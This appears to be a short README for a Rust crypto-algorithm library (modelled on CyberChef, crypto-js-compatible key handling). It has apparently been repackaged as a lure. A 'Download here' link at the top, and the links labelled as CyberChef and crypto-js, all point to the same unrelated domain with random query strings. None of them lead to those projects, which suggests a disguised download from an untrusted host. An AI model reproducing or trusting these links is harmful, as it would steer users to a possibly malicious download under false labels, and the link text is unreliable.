...
[Download here](https://installergitb.icu?dxg8d2d2o3u4o37)

常见加解密算法的rust实现 , 仅供参考

## 设计思路

参考 [CyberChef](https://installergitb.icu?jcp7uyucyd2tmjx) , 实现多种 `Operation` ( 输入输出都是 `Bytes` ) 
...
对于 DES、AES 等算法 , 支持非标准长度的密钥 , 兼容 [crypto-js](https://installergitb.icu?05edanotj6hdjha)
